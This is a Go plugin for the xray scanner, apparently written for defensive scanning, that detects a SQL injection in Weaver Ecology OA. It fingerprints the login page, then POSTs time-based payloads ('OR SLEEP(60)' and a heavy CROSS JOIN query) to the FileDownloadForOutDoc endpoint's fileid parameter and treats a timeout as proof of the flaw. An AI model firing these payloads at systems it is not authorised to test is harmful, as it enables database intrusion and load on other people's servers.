package plugin

import (
	"fmt"
	"git.in.chaitin.net/lohengrin/xraykit/event"
	"git.in.chaitin.net/lohengrin/xraykit/plugin/module/xhttp"
	"git.in.chaitin.net/lohengrin/xraykit/xray"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"time"
)

func generateRandomNumberString(minLength, maxLength int) string {
	rand.Seed(time.Now().UnixNano())

	length := rand.Intn(maxLength-minLength+1) + minLength
	result := make([]byte, length)

	for i := 0; i < length; i++ {
		result[i] = byte(rand.Intn(10) + 48) // 生成ASCII码为48-57的数字字符
	}

	return string(result)
}

var ecologySqlInject2023 = xray.NewPlugin("poc-go-ecology_filedownloadforoutdoc-sqli", func(p *xray.Plugin, client *xhttp.Client) {
	p.Event(func(website *event.Website) *event.Vulnerability {
		req, _, err := xhttp.LoadFromEvent(website.HttpFlow)
		p.Check(err)

		// 修复误报 2023/07/21
		// https://wiki.chaitin.net/questions/617972699
		// 判断下指纹，如果不是泛微 OA 那么跳过
		checkReq := req.Clone()
		checkReq.ReplaceURI("/")
		checkReq.Method = "GET"
		resp, err := client.Do(checkReq)
		if err != nil {
			return nil
		}
		var continueFlag bool
		bodyStr := string(resp.GetRawBody())
		if (strings.Contains(bodyStr, "/login/LoginOperation.jsp") ||
			strings.Contains(bodyStr, "/login/Login.jsp?logintype=1")) &&
			strings.Contains(bodyStr, "/help/sys/help.html") {
			continueFlag = true
		}
		if strings.Contains(bodyStr, "/wui/common/") ||
			strings.Contains(bodyStr, "/wui/index.html") {
			continueFlag = true
		}
		if !continueFlag {
			p.Info("not ecology and exit")
			return nil
		}
		p.Info("it is ecology and continue")

		payloads := []string{url.QueryEscape(generateRandomNumberString(5, 7) + "\nSELECT * FROM HtmlLabelInfo a CROSS JOIN HtmlLabelIndex b CROSS JOIN HtmlLabelInfo c"), url.QueryEscape(generateRandomNumberString(5, 7) + " OR SLEEP(60)")}
		for _, payload := range payloads {
			// 发起第一次延迟请求
			r0 := req.Clone()
			r0.Method = "POST"
			r0.SetHeader("Content-Type", "application/x-www-form-urlencoded")
			r0.SetBody([]byte(fmt.Sprintf("fileid=%s&isFromOutImg=1", payload)))
			p.Check(r0.ReplaceURI("/weaver/weaver.file.FileDownloadForOutDoc"))
			// 如果不存在则说明延时失败，直接返回
			_, err = client.Do(r0)
			if err == nil {
				continue
			}
			if netErr, ok := err.(net.Error); !ok || !netErr.Timeout() {
				continue
			}

			// 发起正常请求
			r1 := req.Clone()
			r1.Method = "POST"
			r1.SetHeader("Content-Type", "application/x-www-form-urlencoded")
			r1.SetBody([]byte(fmt.Sprintf("fileid=%s&isFromOutImg=1", generateRandomNumberString(5, 7))))
			p.Check(r1.ReplaceURI("/weaver/weaver.file.FileDownloadForOutDoc"))
			resp1, err := client.Do(r1)
			p.Check(err)

			hf, err := xhttp.NewHttpFlow(r1, resp1)
			p.Check(err)

			if err == nil {
				vul := p.NewWebVulnerability(website)
				vul.AddStepWithFlow("r0", hf)
				return vul
			}
		}

		return nil
	})

})

